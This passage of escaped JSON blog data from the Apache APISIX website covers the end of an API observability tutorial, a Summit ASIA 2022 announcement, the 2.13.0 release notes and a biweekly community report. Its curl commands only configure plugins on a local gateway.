outcome.\\n\\n![prometheus-plugin-dashboard-query-http-status-screenshot](https://static.apiseven.com/202108/1650506329360-f6e53316-cf26-475b-a5d7-dc77fb200130.png)\\n\\n![prometheus-plugin-dashboard-query-http-status-table-screenshot](https://static.apiseven.com/202108/1650506385033-9913d5e6-2441-4761-bb49-c185048f3caf.png)\\n\\nIn addition to this, you can view the Grafana dashboard running in your local instance. Go to\xa0`http://localhost:3000/`\\n\\n![prometheus-plugin-grafana-dashboard-screenshot](https://static.apiseven.com/202108/1650506413963-781b2820-b82a-4556-b06c-6dfd7a23abab.png)\\n\\n## Tracing\\n\\nThe third is\xa0**tracing**\xa0or distributed tracing allows you to understand the life of a request as it traverses your service network and allows you to answer questions like what service has this request touched and how much latency was introduced. Traces enable you to further explore which logs to look at for a particular session or related set of API calls.\\n\\n[Zipkin](https://zipkin.io/), an open-source distributed tracing system. [APISIX plugin](https://apisix.apache.org/docs/apisix/plugins/zipkin) is supported to collect tracing and report to Zipkin Collector based on [Zipkin API specification](https://zipkin.io/pages/instrumenting.html).\\n\\nHere\u2019s an example to enable the\xa0_zipkin plugin_\xa0on the specified route:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/get\\",\\n    \\"plugins\\": {\\n        \\"zipkin\\": {\\n            \\"endpoint\\": \\"http://127.0.0.1:9411/api/v2/spans\\",\\n            \\"sample_ratio\\": 1\\n        }\\n    },\\n    \\"upstream_id\\": \\"1\\"\\n}\'\\n```\\n\\nWe can test our example by simply running the following curl command:\\n\\n`curl -i http://127.0.0.1:9080/get`\\n\\nAs you can see, there are some additional trace identifiers (like traceId, spanId, parentId) were appended to the headers:\\n\\n```\\n\\"X-B3-Parentspanid\\": \\"61bd3f4046a800e7\\",\\n\\"X-B3-Sampled\\": \\"1\\",\\n\\"X-B3-Spanid\\": \\"855cd5465957f414\\",\\n\\"X-B3-Traceid\\": \\"e18985df47dab632d62083fd96626692\\",\\n```\\n\\nThen you can use a browser to access\xa0`http://127.0.0.1:9411/zipkin`, see traces on the Web UI of Zipkin.\\n\\n> Note that you need to run the Zipkin instance in order to install Zipkin Web UI. For example, by using docker you can simply run it:\\n> `docker run -d -p 9411:9411 openzipkin/zipkin`\\n\\n![Zipkin plugin output 1](https://static.apiseven.com/202108/1650506478581-395f9706-e3f4-4687-9744-4fb7e7f17d93.png)\\n\\n![Zipkin plugin output 2](https://static.apiseven.com/202108/1650506596789-f5a1207b-21ea-4250-abc6-a8f3c35d877d.png)\\n\\nAs you noticed, the recent traces were exposed in the above pictures.\\n\\n## Summary\\n\\nAs we learned, API Observability is a sort of framework for managing your applications in an API world and Apache APISIX API Gateway plugins can help when observing modern API-driven applications by integrating to several observability platforms. So, you can make your development work focused on core business features instead of building a custom integration for observability tools.\\n\\nYou can also click below to get more details:\\n\\n* [Download Apache APISIX](https://apisix.apache.org/downloads)\\n* [Getting Started with Apache APISIX](https://youtu.be/dUOjJkb61so)\\n* [Getting Started with Apache APISIX Dashboard](https://youtu.be/-9-HZKK2ccI)\\n* [Overview of Apache APISIX Plugins](https://youtu.be/ixSZA4ILBKQ)\\n* [Install Apache APISIX](https://apisix.apache.org/docs/apisix/how-to-build)\\n* [Watch the Video version of the blog post](https://youtu.be/XK0xcui5BQU)\\n\\nIf you have any questions, feel free to mail [Apache APISIX Community](https://apisix.apache.org/docs/general/join/)"},{"id":"Apache APISIX Summit ASIA 2022 is coming","metadata":{"permalink":"/blog/2022/04/12/apisix-summit-asia-2022","source":"@site/blog/2022/04/12/apisix-summit-asia-2022.md","title":"Apache APISIX Summit ASIA 2022 is coming","description":"The Apache APISIX community will organize the Apache APISIX Summit ASIA 2022 on May 20-21, 2022 via \\"Live Streaming\\".","date":"2022-04-12T00:00:00.000Z","formattedDate":"April 12, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":5.215,"truncated":true,"authors":[],"prevItem":{"title":"API Observability with APISIX Plugins","permalink":"/blog/2022/04/17/api-observability"},"nextItem":{"title":"Release Apache APISIX 2.13.0","permalink":"/blog/2022/03/28/release-apache-apisix-2.13"}},"content":"> The Apache APISIX community will organize the Apache APISIX Summit ASIA 2022 on May 20-21, 2022.\\n\\n\x3c!--truncate--\x3e\\n\\n![Summit Post](https://static.apiseven.com/202108/1649729812376-b05269c8-90b9-4d73-b97e-463beb351d1d.png)\\n\\n[Click here](https://apisix-summit.org/) to register for **Apache APISIX Summit ASIA 2022**.\\n\\n## Conference Introduction\\n\\nSince Apache APISIX was officially open sourced on June 6, 2019, it has been growing rapidly as a community. In just over two years, the number of global contributors has exceeded 400, and the number is still growing rapidly. During this time, the Apache APISIX community has also successively gained recognition from domestic and foreign developers.\\n\\nAs an open source cloud native API gateway, Apache APISIX enables companies to quickly and securely process API and microservice traffic in scenarios such as gateways, Kubernetes Ingress, and service grids. Now, hundreds of companies around the world use Apache APISIX to process business-critical traffic, including finance, Internet, manufacturing, retail, carriers, and so on.\\n\\nIn order to help more companies, developers and open source enthusiasts better understand and use Apache APISIX, and to help community members better understand the latest progress and developments of Apache APISIX, the Apache APISIX community will organize the **Apache APISIX Summit ASIA 2022** online on May 20-21, 2022.\\n\\nTechnical experts from API7.ai, AliCloud, Tencent Cloud, Tencent Blue Whale, WPS, Snowball, VMware Tanzu, Beeto, Excelliance Technology, Huya, and UPYun will bring the most cutting-edge usecase and practical sharing of Apache APISIX.\\n\\nThere are more important speakers: Fei Xiong (Partner of Matrix Partners China), Sheng Wu (Apache Member), Mark Shan (Chair of Tencent Open Source Alliance), Ming Wen (Apahce APISIX PMC Chair), Trista Pan (Co-founder&CTO of SphereEx), Jia Zhai (Co-founder of StreamNative), Yeliang Wang (Partner of API7.ai), Yubo Wang (Director of Developer Relations of AWS), Xiaosi Zhou (QingCloud Head of Container Division and KubeSphere Founder), to discuss open source infrastructure software, internationalization and ecological construction.\\n\\n## Topics\\n\\n### The Future of Apache APISIX: Empowering API Connectivities in the Digital World\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649753814098-6c7fa7d6-bac0-4f72-bcba-9367b7e4c59b.png\\" alt=\\"Ming Wen\\" style={{width: \\"300px\\"}} />\\n\\nMing Wen, Apache APISIX PMC Chair, API7.ai Co-Founder\\n\\n### The Globalization Path for Open Source Products Through Community Ecology\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754170526-0567dfa2-e092-42b9-b489-818844d5f60e.png\\" alt=\\"Fei Xiong\\" style={{width: \\"300px\\"}} />\\n\\nFei Xiong, Matrix Partners China Partner\\n\\n### The Correct Understanding of Open Source for Companies\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754208008-9a1c1c42-7443-4a05-bfc7-6bfada38be9b.png\\" alt=\\"Sheng Wu\\" style={{width: \\"300px\\"}} />\\n\\nSheng Wu, Tetrate Founding Engineer, Apache SkyWalking Founder\\n\\n### Apache APISIX Roadmap\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754287122-ffd70624-526e-4e47-8944-ea675e8cafb2.png\\" alt=\\"Yuansheng Wang\\" style={{width: \\"300px\\"}} />\\n\\nYuansheng Wang, Apache APISIX PMC Member, API7.ai Co-Founder&CTO\\n\\n### Automated Operation and Maintenance Platform Based on Apache APISIX\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754397286-265b70cd-00fb-4618-a2fb-b8ed3f156879.png\\" alt=\\"Qing Chen\\" style={{width: \\"300px\\"}} />\\n\\nQing Chen\uff0cOps Architect of Excelliance Tech.\\n\\n### Design and Production Practice Based on Apache APISIX Full-link Grayscale Capability\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754486535-2384e0d3-09eb-4a4f-9749-f9eb789eefdf.png\\" alt=\\"Shengwei Pan\\" style={{width: \\"300px\\"}} />\\n\\nShengwei Pan, Product Development Engineer of Alibaba Cloud\\n\\n### How to Secure an App Out of the Box with Apache APISIX and Keycloak?\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754632367-a2c926b8-38cd-46e6-a37c-15d09dfc58fc.png\\" alt=\\"Jean-Philippe GOUIN\\" style={{width: \\"300px\\"}} />\\n\\nJean-Philippe GOUIN\uff0cVMware Tanzu Labs Product Manager\\n\\n### Head of API Experience and Operations\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754730088-df00e488-4b91-41d4-a504-e007dbc7bb36.png\\" alt=\\"Daniel Kocot\\" style={{width: \\"300px\\"}} />\\n\\nDaniel Kocot, VMware Tanzu Labs Product Manager\\n\\n### Building a Cloud-Native Integrated Architecture based on APISIX and RocketMQ\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754840337-d341f228-50aa-4b0f-9825-dff00a2694d9.png\\" alt=\\"Heng Du\\" style={{width: \\"300px\\"}} />\\n\\nHeng Du, Alibaba Cloud Senior Technical Expert, Apache RocketMQ PMC Member\\n\\n### Etcd Governance Practices in Scenarios of Large-scale Apache APISIX - Kstone\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754905828-8662cabb-f2b7-484f-8853-364839f89fca.png\\" alt=\\"Chaofan Wang\\" style={{width: \\"300px\\"}} />\\n\\nChaofan Wang, Head of TKE Cluster Management at Tencent Cloud\\n\\n### Use Apache APISIX on Kubernetes\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754972861-8ec9eced-075a-421f-835f-6ebf0811f967.jpg\\" alt=\\"Chao Zhang\\" style={{width: \\"300px\\"}} />\\n\\nChao Zhang, Apache APISIX PMC Member, API7.ai Technical Expert\\n\\n### Service Mesh Evolution From Gateway to Full Traffic Proxy Apache APISIX\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755032049-b35c2f44-aecc-4dce-8768-4b2500dfc4d4.png\\" alt=\\"Jintao Zhang\\" style={{width: \\"300px\\"}} />\\n\\nJintao Zhang, Apache APISIX PMC Member, API7.ai Technical Expert\\n\\n### Design and Application of BlueKing API Gateway Based on Apache APISIX\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755117432-8b365e5e-eced-4363-8564-adeb81a006b8.png\\" alt=\\"Rui Chen\\" style={{width: \\"300px\\"}} />\\n\\nRui Chen, Head of BlueKing Container Platform and Microservices Project at Tencent\\n\\n### How Service Meshes Provide Platform-Level Microservice Governance Capabilities\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755167267-a7759d7f-7864-4f2b-b7a7-1a2b5d1aa8d3.png\\" alt=\\"Qi Gu\\" style={{width: \\"300px\\"}} />\\n\\nQi Gu, Technical Expert of Alibaba Cloud Native Application Platform at Alibaba Cloud\\n\\n### Production Practice of Apache APISIX Gateway in Snowball\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755370572-5e134779-223e-4eec-9a96-857667131f0b.png\\" alt=\\"Wenjie Shi\\" style={{width: \\"300px\\"}} />\\n\\nWenjie Shi, Senior Development Engineer of Basic Components at Snowball\\n\\n### The Landing Practice of Apache APISIX Ingress in UPYUN\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755492680-bd78091d-380a-491d-8e44-eb67cbcab7f6.png\\" alt=\\"Zhuo Chen\\" style={{width: \\"300px\\"}} />\\n\\nZhuo Chen, Senior System Development Engineer of UPYUN\\n\\n### The Implementation of Apache APISIX in Kingsoft Office Software and Development Experience based on APISIX\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755650884-e463be09-c151-4b7d-9c90-3b6e942b9baf.png\\" alt=\\"Qiang Zhang\\" style={{width: \\"300px\\"}} />\\n\\nQiang Zhang, Head of Cloud Platform Gateway at WPS\\n\\n### Apache APISIX Gateway Application Practice of Beeto in the Middle East\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755834307-fe88fc18-4385-4593-9cb5-b63c82344918.png\\" alt=\\"Lilin Hu\\" style={{width: \\"300px\\"}} />\\n\\nLilin Hu, R&D Director of Beeto\\n\\n### Multi-Cloud Dynamic Ingress Using Apache APISIX in Huya\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649755867711-ba0cb5c0-bf32-48e5-8417-777c98e946f6.png\\" alt=\\"Jian Zhou\\" style={{width: \\"300px\\"}} />\\n\\nJian Zhou, Senior Java Development Engineer of Huya\\n\\n### Panel: Globalization of Open Source Infrastructure Software and Company Ecosystem\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649753814098-6c7fa7d6-bac0-4f72-bcba-9367b7e4c59b.png\\" alt=\\"Ming Wen\\" style={{width: \\"300px\\"}} />\\n\\nMing Wen, Apache APISIX PMC Chair, API7.ai Co-Founder\\n\\n<img src=\\"https://static.apiseven.com/202108/1649756082972-bc9125e7-75ea-4d49-9f77-2734f4e405ca.png\\" alt=\\"Trista Pan\\" style={{width: \\"300px\\"}} />\\n\\nTrista Pan, SphereEx Co-Founder & CTO, Apache Shardingsphere PMC Member\\n\\n<img src=\\"https://static.apiseven.com/202108/1649756136470-95ae5822-cb1f-4e52-bc07-b1012bddad70.png\\" alt=\\"Mark Shan\\" style={{width: \\"300px\\"}} />\\n\\nMark Shan, Chair of Tencent Open Source Alliance\\n\\n<img src=\\"https://static.apiseven.com/202108/1649756182945-e22cb5c9-c74b-4f1d-81db-0784c17f305c.jpg\\" alt=\\"Jia Zhai\\" style={{width: \\"300px\\"}} />\\n\\nJia Zhai, StreamNative Co-Founder\\n\\n### Panel: The Importance of Ecosystem to Open Source Projects\\n\\n#### Speaker\\n\\n<img src=\\"https://static.apiseven.com/202108/1649756270951-9479e9f2-c523-4927-a840-a6d2a8cf0b01.png\\" alt=\\"Yeliang Wang\\" style={{width: \\"300px\\"}} />\\n\\nYeliang Wang, API7.ai Partner and VP of Technology\\n\\n<img src=\\"https://static.apiseven.com/202108/1649754208008-9a1c1c42-7443-4a05-bfc7-6bfada38be9b.png\\" alt=\\"Sheng Wu\\" style={{width: \\"300px\\"}} />\\n\\nSheng Wu, Tetrate Founding Engineer, Apache SkyWalking Founder\\n\\n<img src=\\"https://static.apiseven.com/202108/1649756372774-773e120d-3f67-419d-be0e-914579c24084.png\\" alt=\\"Xiaosi Zhou\\" style={{width: \\"300px\\"}} />\\n\\nXiaosi Zhou, QingCloud Head of Container Division, KubeSphere Founder\\n\\n<img src=\\"https://static.apiseven.com/202108/1649756433342-96ad1548-7a66-4476-8288-03b108cb8dd3.jpg\\" alt=\\"Yubo Wang\\" style={{width: \\"300px\\"}} />\\n\\nYubo Wang, Amazon Web Services, Director of Developer Relations\\n\\n## How to Participate\\n\\nScan the QR code or [click here](https://apisix-summit.org/) to register for **Apache APISIX Summit ASIA 2022**.\\n\\n<img src=\\"https://static.apiseven.com/202108/1649733967719-664f2584-6e5a-41c1-b799-fa337b89ecc3.png\\" alt=\\"Website QR Code\\" style={{width: \\"300px\\"}} />\\n\\n### Join the Apache APISIX Slack channel\\n\\nJoin Apache Software Foundation Slack workspace using [this invitation link](https://join.slack.com/t/the-asf/shared_invite/zt-vlfbf7ch-HkbNHiU_uDlcH_RvaHv9gQ) (_Please [open an issue](https://apisix.apache.org/docs/general/submit-issue/) if this link is expired_), and then join the **#apisix** channel (Channels -> Browse channels -> search for \\"apisix\\")."},{"id":"Release Apache APISIX 2.13.0","metadata":{"permalink":"/blog/2022/03/28/release-apache-apisix-2.13","source":"@site/blog/2022/03/28/release-apache-apisix-2.13.md","title":"Release Apache APISIX 2.13.0","description":"Apache APISIX 2.13.0 LTS version is released. This version not only has more stable performance, but also supports more observability and service discovery plugins.","date":"2022-03-28T00:00:00.000Z","formattedDate":"March 28, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.935,"truncated":true,"authors":[{"name":"Zexuan Luo","title":"Author","url":"https://github.com/spacewander","image_url":"https://avatars.githubusercontent.com/u/4161644?v=4","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://github.com/yzeng25.png","imageURL":"https://github.com/yzeng25.png"}],"prevItem":{"title":"Apache APISIX Summit ASIA 2022 is coming","permalink":"/blog/2022/04/12/apisix-summit-asia-2022"},"nextItem":{"title":"Biweekly Report (Mar 1st - Mar 14th)","permalink":"/blog/2022/03/24/weekly-report-0314"}},"content":"> Apache APISIX community has rolled out a new LTS version, 2.13.0. This version not only delivers more stable performance, but also supports more observability and service discovery plugins, as well as a more robust multilingual development system.\\n\\n\x3c!--truncate--\x3e\\n\\nIt has been more than half a year since the last LTS release of Apache APISIX, and today the Apache APISIX community is bringing a new LTS release, 2.13.0, which is not only more stable, but also supports more observability and service discovery plugins, and a more complete multilingual development system.\\n\\nIf you\'re trying to find a balance between stability and new features, Apache APISIX 2.13.0 is an ideal choice. Since 2.13.0 is a LTS version, we will release a series of patch releases based on 2.13.0.\\n\\n![Apache APISIX 2.13.0 Features Preview](https://static.apiseven.com/202108/1648452101951-d69cb087-a6b4-490f-9a7b-47e122f72240.png)\\n\\n## Features Preview\\n\\n### New Change: API Is No Longer Exposed by Default\\n\\nIn versions prior to 2.13.0, we allowed plugins to register APIs that could be called by clients. For example, the `jwt-auth` plugin would register a JWT-signed interface that could be accessed by clients to generate signatures for validation. However, this design has a  drawback - since it is the interface that is exposed and not the route, it is not possible to enforce security for it in the same way as for routes. While existing mechanisms allow users to intercept interface access by writing a corresponding plugin interceptor, there are still security risks in this approach.\\n\\n**Starting with version 2.13.0, we decide to make a major change and no longer expose the API by default**. If a user needs to expose an interface, they need to bind the interface to the corresponding route via the `public-api` plugin. This approach brings two benefits.\\n\\n1. registered APIs will have higher visibility, currently registered APIs only take effect through display configuration, and access is user-defined.\\n2. More security options are allowed, and registered APIs have the same permission controls as routes.\\n\\nOf course, there are other new changes in version 2.13.0, such as fixing unusual behaviors in previous versions. See [Apache APISIX 2.13.0 Changelog](https://github.com/apache/apisix/blob/release/2.13/CHANGELOG.md#2130) for detailed information.\\n\\n### New Features: Enhancements in Observability\\n\\nAs an API gateway, Apache APISIX has been working to connect more services and open up more observability upstream and downstream. We\'ve been puting efforts in this field with every release, and 2.13.0 is also included.\\n\\n**This time we have added a new tracing plugin: `opentelemetry`, which allows sending OpenTelemetry tracing data to the configured collector**. Here is an example.\\n\\nThe collector is set in the static configuration.\\n\\n```yaml\\nplugin_attr:\\n  opentelemetry:\\n    resource:\\n      service.name: APISIX\\n      tenant.id: business_id\\n    collector:\\n      address: \\"127.0.0.1:4317\\"\\n    batch_span_processor:\\n      drop_on_queue_full: false\\n      max_queue_size: 6\\n      batch_timeout: 2\\n      inactive_timeout: 1\\n      max_export_batch_size: 2\\n```\\n\\nAfter that, tracing can be enabled on a specific route.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uris\\": [\\n        \\"/uid/*\\"\\n    ],\\n    \\"plugins\\": {\\n        \\"opentelemetry\\": {\\n            \\"sampler\\": {\\n                \\"name\\": \\"always_on\\"\\n            }\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:8089\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nRequests that hit this route will report OpenTelemetry data to the corresponding collector.\\n\\nIn addition, we have added two new logging plugins that support reporting logs to ClickHouse and Loggly.\\n\\nClickHouse is one of the fastest OLAP databases in the world. Apache APISIX supports sending access logs and error logs to ClickHouse, as shown in the following example.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n      \\"plugins\\": {\\n            \\"clickhouse-logger\\": {\\n                \\"user\\": \\"default\\",\\n                \\"password\\": \\"a\\",\\n                \\"database\\": \\"default\\",\\n                \\"logtable\\": \\"test\\",\\n                \\"endpoint_addr\\": \\"http://127.0.0.1:8123\\"\\n            }\\n       },\\n      \\"upstream\\": {\\n           \\"type\\": \\"roundrobin\\",\\n           \\"nodes\\": {\\n               \\"127.0.0.1:1980\\": 1\\n           }\\n      },\\n      \\"uri\\": \\"/hello\\"\\n}\'\\n```\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/plugin_metadata/error-log-logger  \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"clickhouse\\": {\\n      \\"user\\": \\"default\\",\\n      \\"password\\": \\"a\\",\\n      \\"database\\": \\"error_log\\",\\n      \\"logtable\\": \\"t\\",\\n      \\"endpoint_addr\\": \\"http://127.0.0.1:8123\\"\\n  }\\n}\'\\n```\\n\\nLoggly is SolarWinds\' SaaS platform for log processing, and we support sending access logs via syslog or HTTP/HTTPS. Examples are as follows.\\n\\nConfigure reporting method.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/plugin_metadata/loggly  \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n   \\"protocol\\": \\"http\\"\\n}\'\\n```\\n\\nConfigure the routes that need to be reported.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\":{\\n        \\"loggly\\":{\\n            \\"customer_token\\":\\"xxx\\",\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:80\\":1\\n        }\\n    },\\n    \\"uri\\":\\"/index.html\\"\\n}\'\\n```\\n\\n### Better Multilingual Development System\\n\\nApache APISIX has supported Wasm (Proxy Wasm SDK) since version 2.11, but the LTS version has not provided support for it. We add and improv this feature in 2.13.0.\\n\\nAfter six months of development with over 10,000 lines of code (including testing and documentation), APISIX now has full support for running Wasm code in all four phases of **processing request headers, request bodies, response headers, and response bodies**. Apache APISIX 2.13.0 is the first LTS release to support Wasm, and we consider it as a milestone.\\n\\nIn addition to Wasm, we are also working on a traditional, RPC-based multilingual plugin system. Not long ago, we released Python Runner version 0.2.0. In a few days, we will also release Go Runner 0.3.0.\\n\\n## Bugfixes\\n\\n- SkyWalking and OpenTelemetry do not track authentication failures.\\n- `log-rotate` cutting logs do not support completion by hours.\\n- `deepcopy` does not copy `metatable`.\\n- `request-validate` handling of duplicate keys in JSON.\\n- `prometheus` duplicate calculation metrics.\\n- `conf.method` in `proxy-rewrite` does not work when `conf.headers` is missing.\\n- `traffic-split` fails to match when the first rule fails.\\n- etcd timeout triggers `resync_delay`.\\n- `proto` definition conflict.\\n- `limit-count` configuration remains unchanged and resets the counter.\\n- Admin API\'s `plugin-metadata` count and `global-rule` count report wrong count numbers.\\n- Labels are missing when merging route and service.\\n\\n## More Details\\n\\nIn addition to the above features and components, Apache APISIX version 2.13.0 has been updated with the following features.\\n\\n- grpc-transcode support for processing proto definitions with import via `.pb` files.\\n- Support for fetching upstream nodes from K8s configuration.\\n- Added `csrf` plugin to provide protection against cross-site request forgery.\\n- Add `mocking` plugin to generate test data easily."},{"id":"Biweekly Report (Mar 1st - Mar 14th)","metadata":{"permalink":"/blog/2022/03/24/weekly-report-0314","source":"@site/blog/2022/03/24/weekly-report-0314.md","title":"Biweekly Report (Mar 1st - Mar 14th)","description":"In the past two weeks, the Apache APISIX community has added many functions about plugins such as openid-connect, authz-keycloak, cors, csrf, and jwt-auth.","date":"2022-03-24T00:00:00.000Z","formattedDate":"March 24, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.1,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 2.13.0","permalink":"/blog/2022/03/28/release-apache-apisix-2.13"},"nextItem":{"title":"Integrate API Gateway with Eureka","permalink":"/blog/2022/03/05/apisix-integration-eureka-service-discovery"}},"content":"> From March 1st to  March 14th, 44 contributors submitted 131 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1647397912415-95b2e4c4-02f1-4cd7-8cfa-c53346e8eb42.jpg)\\n\\n![New Contributors](https://static.apiseven.com/202108/1647397912458-f3a7d62e-0b03-45ef-a492-7bc59ac8cf33.png)\\n\\n## Good first issue\\n\\n### Issue #6344\\n\\n**Link**: https://github.com/apache/apisix/issues/6344\\n\\n**Issue description**:\\n\\nAs a User, I want to use `forward-auth` plugin but the plugin cann\'t support request body sent to authorization server to authentication form request body so that can you plan to do it?\\n\\n### Issue #6197\\n\\n**Link**: https://github.com/apache/apisix/issues/6197\\n\\n**Issue description**:\\n\\nHow to current limit both in minutes and day by using plugin `limit-count`?\\n\\nCurrently, the plugin `limit-count` only Set a traffic limiting mode, Second or minute,If I want to set seconds and minutes at the same time,plugin not support,Because what you set later overwrites what you set earlier,Is there a better solution to this problem?thank you\\n\\n## Highlights of Recent Features\\n\\n- [Support post_logout_redirect_uri config in `openid-connect` plugin](https://github.com/apache/apisix/pull/6455)(Contributor: [starsz](https://github.com/starsz))\\n\\n- [`ext-plugin` supports rewriting response headers](https://github.com/apache/apisix/pull/6426)(Contributor: [rampagecong](https://github.com/rampagecong))\\n\\n- [`proxy-mirror` plugin supports custom paths](https://github.com/apache/apisix/pull/6506)\uff08Contributor: [spacewander](https://github.com/spacewander))\\n\\n- [Wasm supports getting response body](https://github.com/apache/apisix/pull/6514)(Contributor: [spacewander](https://github.com/spacewander))\\n\\n- [Support to run the rewrite phase for newly added plugins in consumer](https://github.com/apache/apisix/pull/6502)(Contributor: [tzssangglass](https://github.com/tzssangglass))\\n\\n- [Support for reading environment variables from yaml configuration files](https://github.com/apache/apisix/pull/6505)(Contributor: [wilson-1024](https://github.com/wilson-1024))\\n\\n- [`authz-keycloak` plugin supports redirect not authorized user](https://github.com/apache/apisix/pull/6485)\uff08Contributor: [oil-oil](https://github.com/oil-oil))\\n\\n- [`cors` plugin supports setting allow origins by plugin metadata](https://github.com/apache/apisix/pull/6546)(Contributor: [Gary-Airwallex](https://github.com/Gary-Airwallex))\\n\\n- [`CSRF` plugin supports checking whether the token has expired](https://github.com/apache/apisix/pull/6201)(Contributor: [Baoyuantop](https://github.com/Baoyuantop))\\n\\n- [`jwt-auth` plugin supports custom parameters](https://github.com/apache/apisix/pull/6561)(Contributor: [liangliang4ward](https://github.com/liangliang4ward))\\n\\n- [`proxy mirror` plugin supports setting the timeout](https://github.com/apache/apisix/pull/6562)\uff08Contributor: [Gerrard-YNWA](https://github.com/Gerrard-YNWA))\\n\\n- [APISIX Dashboard supports loading specified configuration files through environment variables](https://github.com/apache/apisix-dashboard/pull/2293)(Contributor: [bzp2010](https://github.com/bzp2010) and [kevinw66](https://github.com/kevinw66))\\n\\n- [APISIX Dashboard supports UI configuration protocol buffers](https://github.com/apache/apisix-dashboard/pull/2320)(Contributor: [oil-oil](https://github.com/oil-oil))\\n\\n- [APISIX Dashboard routing advanced matching support processing \\"!\\" inverse operator](https://github.com/apache/apisix-dashboard/pull/2364)(Contributor: [SkyeYoung](https://github.com/SkyeYoung))\\n\\n- [APISIX Dashboard supports detailed configuration of `cors`](https://github.com/apache/apisix-dashboard/pull/2341)\uff08Contributor: [zaunist](https://github.com/zaunist))\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [How to Integrate API Gateway with Eureka?](https://apisix.apache.org/blog/2022/03/05/apisix-integration-eureka-service-discovery)\\n\\n  This article describes how to enable Eureka as a service discovery in the API gateway Apache APISIX and how to use diagnostic tools to find problems in the link.\\n\\n- [Making It Simple, Apache APISIX Integrates ClickHouse to Improve Logging Efficiency](https://apisix.apache.org/blog/2022/03/04/apigateway-clickhouse-makes-logging-easier)\\n\\n  This article describes how community contributor Zhendong Qi contributed clickhouse-logger to Apache APISIX and how he used the plugin to simplify the business architecture and improve the efficiency of logging.\\n\\n- [Apache APISIX and CoreDNS open new doors for service discovery](https://apisix.apache.org/blog/2022/03/04/apisix-uses-coredns-enable-service-discovery)\\n\\n  As a cloud native API gateway, Apache APISIX also integrates multiple service discovery capabilities. This article will show you how to configure CoreDNS in Apache APISIX.\\n\\n- [How to Use Gitpod to Develop API Gateway?](https://apisix.apache.org/blog/2022/03/03/develop-apisix-with-gitpod)\\n\\n  This article introduces the open source cloud IDE product - Gitpod, and demonstrates how to use Gitpod to develop API gateway Apache APISIX and solutions of common problems."},{"id":"Integrate API Gateway with 